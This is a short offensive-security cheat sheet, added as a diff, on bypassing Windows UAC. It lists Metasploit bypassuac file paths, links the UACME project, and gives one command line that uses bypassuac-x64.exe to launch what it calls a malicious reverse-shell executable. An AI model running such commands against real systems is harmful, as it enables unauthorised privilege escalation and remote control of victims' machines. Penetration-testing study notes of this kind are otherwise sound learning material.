@@ -1,0 +1,23 @@
+BYPASS-UAC
+bypass UAC
+
+Locations of files 
+
+/usr/share/metasploit-framework/data/post/bypassuac-x64.dll
+/usr/share/metasploit-framework/data/post/bypassuac-x64.exe
+/usr/share/metasploit-framework/data/post/bypassuac-x86.dll
+/usr/share/metasploit-framework/data/post/bypassuac-x86.exe
+/usr/share/metasploit-framework/modules/exploits/windows/local/bypassuac.rb
+/usr/share/metasploit-framework/modules/exploits/windows/local/bypassuac_injection.rb
+/usr/share/metasploit-framework/modules/exploits/windows/local/bypassuac_vbs.rb
+
+usage
+
+with the exe file you can do the following, to execute a malicious exe reverse shell or something
+
+bypassuac-x64.exe /c C:\users\els\desktop\rtcp.exe
+
+bypassuac is the file -- /c is the argument -- rtcp.exe is the malicious shell
+
+https://github.com/hfiref0x/UACME
+
